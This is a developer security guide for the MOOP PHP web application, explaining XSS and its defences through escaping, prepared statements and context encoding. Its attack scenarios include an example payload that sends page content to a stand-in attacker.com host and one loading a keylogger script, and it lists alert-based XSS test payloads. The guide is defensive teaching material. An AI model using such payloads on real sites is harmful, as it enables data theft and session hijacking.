# MOOP Security: Input Validation & XSS Prevention

**Last Updated:** January 25, 2026

---

## Overview

MOOP implements multiple layers of input validation and output escaping to prevent security vulnerabilities, particularly **Cross-Site Scripting (XSS)** attacks.

---

## What is XSS (Cross-Site Scripting)?

### Definition
XSS is a security vulnerability where an attacker injects malicious JavaScript code into a web page that gets executed in other users' browsers.

### Real-World Example

**Without XSS protection (VULNERABLE):**
```php
// User enters: <script>alert('hacked')</script>
echo "Welcome, " . $_GET['name'];
// Output: Welcome, <script>alert('hacked')</script>
// Result: Script RUNS in the browser ❌ DANGEROUS
```

**With XSS protection (SAFE):**
```php
// Same malicious input: <script>alert('hacked')</script>
echo "Welcome, " . htmlspecialchars($_GET['name']);
// Output: Welcome, &lt;script&gt;alert('hacked')&lt;/script&gt;
// Result: Displays as text, script doesn't run ✅ SAFE
```

### Attack Scenarios

**Scenario 1: Session Hijacking**
```
Attacker posts: <script>fetch('/steal-session')</script>
↓
Other users visit the page
↓
Script runs in their browser
↓
Their session cookie is stolen
↓
Attacker can impersonate them
```

**Scenario 2: Data Exfiltration**
```
Attacker creates feature with name: <img src=x onerror="fetch('attacker.com?data='+document.body.innerText)">
↓
Admin views the feature
↓
Script runs and sends page content to attacker
↓
Sensitive data leaked
```

**Scenario 3: Malware Distribution**
```
Attacker posts: <script src="http://malware.com/keylogger.js"></script>
↓
Users visit page
↓
Keylogger installed in their browser
↓
Login credentials captured
```

---

## How MOOP Prevents XSS

### 1. Output Escaping with htmlspecialchars()

**The Core Defense:**

All user-controlled data displayed in HTML is escaped using `htmlspecialchars()`:

```php
// Convert dangerous characters:
// < → &lt;
// > → &gt;
// & → &amp;
// " → &quot;
// ' → &#039;
```

**Examples in MOOP codebase:**

**Feature Detail Page** (tools/pages/parent.php):
```php
// Line 221
<?= htmlspecialchars($feature_uniquename) ?>

// Line 282
<em><?= htmlspecialchars($genus) ?> <?= htmlspecialchars($species) ?></em>

// Line 286
<?= htmlspecialchars($common_name) ?>
```

**Annotation Table** (lib/parent_functions.php):
```php
// Line 188
$hit_id = htmlspecialchars($row['annotation_accession']);
$hit_description = htmlspecialchars($row['annotation_description']);
$annotation_source = htmlspecialchars($row['annotation_source_name']);

// Line 201
$html .= "<td><a href=\"" . htmlspecialchars($hit_id_link) . "\" target=\"_blank\">" . $hit_id . "</a></td>";
```

**Organism Display** (lib/display_functions.php):
```php
echo "<h2>" . htmlspecialchars($organism_name) . "</h2>";
```

### 2. Input Validation with Prepared Statements

**For Database Queries:**

All database access uses prepared statements to prevent SQL injection (which could be combined with XSS):

```php
// SAFE - uses parameterized query
$stmt = $db->prepare("SELECT * FROM feature WHERE feature_uniquename = ?");
$stmt->execute([$uniquename]);

// DANGEROUS - never do this
$query = "SELECT * FROM feature WHERE feature_uniquename = '" . $uniquename . "'";
$db->query($query);  // ❌ SQL injection vulnerability
```

### 3. URL Parameter Escaping

**For URLs in HTML attributes:**

```php
// SAFE - urlencode() prevents XSS in URL parameters
<a href="/moop/tools/organism.php?organism=<?= urlencode($organism_name) ?>">

// DANGEROUS - without urlencode
<a href="/moop/tools/organism.php?organism=<?= $organism_name ?>">
// If organism contains quotes/special chars, could break HTML
```

### 4. JSON Output Escaping

**For JSON responses in AJAX:**

```php
// SAFE - json_encode() handles escaping
header('Content-Type: application/json');
echo json_encode(['message' => $user_input]);

// DANGEROUS - raw string interpolation
echo '{"message": "' . $user_input . '"}';  // ❌ Could break JSON structure
```

---

## Where XSS Protection is Implemented

### Display Locations (High Priority)

| Location | Risk | Protection |
|----------|------|-----------|
| Feature names/descriptions | HIGH | `htmlspecialchars()` |
| Annotation data | HIGH | `htmlspecialchars()` |
| User input in forms | HIGH | `htmlspecialchars()` |
| Search results | HIGH | `htmlspecialchars()` |
| Error messages | HIGH | `htmlspecialchars()` |
| URLs in links | MEDIUM | `urlencode()` or `htmlspecialchars()` |
| Configuration values | MEDIUM | `htmlspecialchars()` |
| Admin panel forms | HIGH | `htmlspecialchars()` |

### Code Patterns

**Pattern 1: Simple text display**
```php
// ✅ CORRECT
<?= htmlspecialchars($data) ?>

// ❌ WRONG
<?= $data ?>
```

**Pattern 2: HTML attributes**
```php
// ✅ CORRECT
<a href="<?= htmlspecialchars($url) ?>">Link</a>

// ❌ WRONG
<a href="<?= $url ?>">Link</a>
```

**Pattern 3: JavaScript data**
```php
// ✅ CORRECT (PHP-generated JS with data)
<script>
const userId = <?= json_encode($user_id) ?>;
const userName = <?= json_encode($user_name) ?>;
</script>

// ❌ WRONG (direct interpolation)
<script>
const userName = "<?= $user_name ?>";  // Could break JS syntax
</script>
```

**Pattern 4: Building HTML strings**
```php
// ✅ CORRECT
$html .= "<td>" . htmlspecialchars($value) . "</td>";

// ❌ WRONG
$html .= "<td>" . $value . "</td>";
```

---

## Testing for XSS Vulnerabilities

### Test Payloads

Use these test inputs to verify XSS protection:

```
Basic script:
<script>alert('XSS')</script>

Event handler:
<img src=x onerror="alert('XSS')">

Encoded script:
<img src=x onerror="alert('XSS')">

Quote breaking:
" onload="alert('XSS')

Single quote:
' onload='alert("XSS")

Data URI:
<img src="data:text/html,<script>alert('XSS')</script>">

SVG vector:
<svg onload="alert('XSS')">
```

### Manual Testing

1. **Search feature by name:**
   - Enter: `<script>alert('XSS')</script>`
   - Expected: Script tag displays as text, no alert
   - If alert appears: ❌ VULNERABILITY

2. **Add annotation:**
   - Enter description: `<img src=x onerror="alert('XSS')">`
   - View feature page
   - Expected: HTML displays as text
   - If alert appears: ❌ VULNERABILITY

3. **User login with special characters:**
   - Username: `test" onload="alert('XSS')`
   - Expected: Displayed safely in session/page
   - If alert appears: ❌ VULNERABILITY

---

## Defense-in-Depth Strategy

MOOP uses **layered security** (defense-in-depth):

```
Layer 1: Input Validation
         ↓ (check for dangerous patterns)
Layer 2: Input Sanitization
         ↓ (remove/encode dangerous chars)
Layer 3: Output Escaping
         ↓ (htmlspecialchars, json_encode)
Layer 4: Content Security Policy (CSP)
         ↓ (browser-level protection - if configured)
Result: Multiple defenses against XSS
```

---

## Related Security Practices

### 1. Prepared Statements (SQL Injection Prevention)
Prevents attackers from modifying SQL queries by injecting code.

```php
// ✅ SAFE
$stmt = $db->prepare("SELECT * FROM feature WHERE id = ?");
$stmt->execute([$id]);

// ❌ VULNERABLE
$result = $db->query("SELECT * FROM feature WHERE id = " . $id);
```

### 2. Session Security
- Secure session tokens (PHP native)
- HttpOnly flag prevents JavaScript access to cookies
- Secure flag (HTTPS only) if using SSL
- SameSite attribute prevents CSRF attacks

### 3. Password Security
- Bcrypt hashing (not plaintext)
- Password verification: `password_verify($input, $hash)`

```php
// ✅ SAFE
if (password_verify($_POST['password'], $stored_hash)) {
    // Login successful
}

// ❌ DANGEROUS
if ($_POST['password'] === $plaintext_password) {
    // Login successful
}
```

### 4. Error Handling
- Sensitive errors logged (not shown to users)
- Generic errors displayed to prevent information leakage

```php
// ✅ SAFE
try {
    $db->query($query);
} catch (Exception $e) {
    error_log($e->getMessage());  // Log detailed error
    echo "Database error occurred";  // Generic message to user
}

// ❌ DANGEROUS
} catch (Exception $e) {
    echo $e->getMessage();  // Leaks sensitive info
}
```

---

## Best Practices for Developers

### Rule 1: Always Escape Output
```php
// When displaying any user-controlled data:
<?= htmlspecialchars($user_data) ?>
```

### Rule 2: Use Prepared Statements
```php
// For all database queries with variables:
$stmt = $db->prepare("SELECT * FROM table WHERE col = ?");
$stmt->execute([$variable]);
```

### Rule 3: Encode for Context
- **HTML context:** `htmlspecialchars()`
- **URL context:** `urlencode()` or `rawurlencode()`
- **JSON context:** `json_encode()`
- **CSS context:** Use CSS escaping or avoid user input
- **JavaScript context:** Use `json_encode()` for data

### Rule 4: Validate Input
```php
// Check input type/format before processing
if (!is_numeric($id)) {
    die("Invalid ID");
}

if (strlen($name) > 255) {
    die("Name too long");
}
```

### Rule 5: Use Security Headers (Optional but Recommended)
```php
// In head-resources.php or main entry point:
header("X-Content-Type-Options: nosniff");  // Prevent MIME-type sniffing
header("X-Frame-Options: SAMEORIGIN");      // Prevent clickjacking
header("X-XSS-Protection: 1; mode=block");   // Browser XSS protection
header("Referrer-Policy: strict-origin-when-cross-origin");
```

---

## Common Mistakes (What NOT to Do)

### ❌ Mistake 1: Forgetting htmlspecialchars()
```php
// WRONG
echo "<h1>" . $title . "</h1>";

// RIGHT
echo "<h1>" . htmlspecialchars($title) . "</h1>";
```

### ❌ Mistake 2: Using strip_tags() for Security
```php
// WRONG - strip_tags is for removing HTML, not for security
$safe = strip_tags($user_input);

// RIGHT
$safe = htmlspecialchars($user_input);
```

### ❌ Mistake 3: Double Escaping
```php
// WRONG - escapes twice (data displays wrong)
echo htmlspecialchars(htmlspecialchars($data));

// RIGHT
echo htmlspecialchars($data);
```

### ❌ Mistake 4: Using Addslashes Instead of Prepared Statements
```php
// WRONG - addslashes is not for SQL injection prevention
$safe = addslashes($user_input);
$db->query("SELECT * WHERE name = '$safe'");

// RIGHT - use prepared statements
$stmt = $db->prepare("SELECT * WHERE name = ?");
$stmt->execute([$user_input]);
```

### ❌ Mistake 5: Trusting User-Supplied File Names
```php
// WRONG - file name could contain ../../../etc/passwd
$file = $_FILES['upload']['name'];
readfile("/uploads/" . $file);

// RIGHT - generate safe file name or validate
$file = uniqid() . '_' . basename($_FILES['upload']['name']);
$file = preg_replace('/[^a-zA-Z0-9._-]/', '', $file);
readfile("/uploads/" . $file);
```

---

## Checklist for Reviewing Code

When reviewing MOOP code, check:

- [ ] All `echo` statements with variables use `htmlspecialchars()`?
- [ ] All database queries use prepared statements?
- [ ] All URLs in href attributes are properly encoded?
- [ ] All JSON responses use `json_encode()`?
- [ ] Error messages don't leak sensitive information?
- [ ] File operations validate/sanitize file paths?
- [ ] User input is validated for length/type before processing?
- [ ] No hardcoded passwords or API keys in code?
- [ ] Sessions use secure configuration?

---

## Resources

- **OWASP XSS Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **PHP htmlspecialchars():** https://www.php.net/manual/en/function.htmlspecialchars.php
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **PHP Prepared Statements:** https://www.php.net/manual/en/pdo.prepared-statements.php

---

## Summary

XSS is prevented in MOOP through:
1. **Output escaping** with `htmlspecialchars()` on all displayed data
2. **Prepared statements** for all database queries
3. **Input validation** to reject invalid data early
4. **Proper encoding** for context (HTML, URL, JSON)
5. **Error handling** that doesn't leak sensitive information

This multi-layered approach prevents attackers from injecting and executing malicious code in MOOP.

---

**For security questions or concerns, contact:** [Admin contact information]
